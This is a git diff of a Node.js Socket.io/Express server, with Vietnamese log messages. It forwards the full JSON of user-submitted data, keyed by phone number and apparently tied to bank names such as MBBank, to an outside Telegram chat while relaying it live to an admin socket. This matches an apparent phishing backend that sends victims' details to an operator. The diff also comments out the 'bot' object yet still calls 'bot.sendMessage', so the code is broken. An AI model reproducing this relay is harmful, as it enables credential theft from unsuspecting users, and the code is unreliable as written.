@@ -10,7 +10,7 @@ var bodyParser = require('body-parser')
 let multer = require("multer");
 var cors = require('cors')
 const token = process.env.TELEGRAM_TOKEN;
-const bot = new TelegramBot(token, { polling: true });
+// const bot = new TelegramBot(token, { polling: true });
 const chatId = process.env.TELEGRAM_CHAT_ID;
 const TG = require('telegram-bot-api')
 const api = new TG({
@@ -130,7 +130,9 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         await socketIo.emit('send-data-admin', {
             ...data,
         });
-        await api.sendMessage(chatId, `Có người dùng vừa đăng ký: ${JSON.stringify(data)}`);
+        await api.sendMessage(chatId, {
+            text: `Có người dùng vừa cập nhật thông tin: ${JSON.stringify(data)}`,
+        });
         // switch (data.bankName) {
         //     case 'MBBank':
         //         console.log('settingData', settingData);
@@ -165,7 +167,9 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
 
     socket.on('send-data-user', async (data) => {
        await socketIo.emit(`send-data-user-${data.numberPhone}`, data);
-       await api.sendMessage(chatId, `Người dùng ${data.numberPhone} vừa cập nhật thông tin: ${JSON.stringify(data)}`);
+        await api.sendMessage(chatId, {
+            text: `Có người dùng vừa cập nhật thông tin: ${JSON.stringify(data)}`,
+        });
     });
 })
 
@@ -439,7 +443,9 @@ app.put('/api/update-user/:numberPhone', async (req, res) => {
             status: 404
         })
     }
-    bot.sendMessage(chatId, `Có người dùng vừa cập nhật thông tin: ${JSON.stringify(req.body)}`);
+    bot.sendMessage(chatId, {
+        text: `Có người dùng vừa cập nhật thông tin: ${JSON.stringify(req.body)}`,
+    });
 
     await users.updateOne({
         numberPhone: numberPhone
